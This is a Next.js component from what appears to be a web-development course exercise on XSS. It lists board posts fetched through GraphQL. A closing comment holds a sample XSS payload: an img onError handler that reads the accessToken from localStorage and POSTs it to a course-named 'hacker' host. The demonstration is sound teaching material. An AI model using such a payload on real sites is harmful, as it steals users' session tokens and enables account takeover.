"use client";

import { gql, useQuery } from "@apollo/client";
import Link from "next/link";

const FETCH_BOARDS = gql`
  query fetchBoards($page: Int) {
    fetchBoards(page: $page) {
      _id
      writer
      title
    }
  }
`;

export default function PaginationPage() {
  const { data } = useQuery(FETCH_BOARDS);

  return (
    <>
      {data?.fetchBoards.map((e) => (
        <Link
          key={e._id}
          href={`/section30/30-03-web-editor-hook-form-xss/${e._id}`}
        >
          <div key={e.number}>
            <span style={{ margin: "10px" }}>{e.title}</span>
            <span style={{ margin: "10px" }}>{e.writer}</span>
          </div>
        </Link>
      ))}
    </>
  );
}

/* playground XSS 공격
=====================================================================
contents:"""
        <img src="#" onError="
          const stollenToken = localStorage.getItem("accessToken");
          fetch("http://main-hacker.codebootcamp.co.kr/>token", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: stollenToken })
          })"
        />
"""
=====================================================================
*/
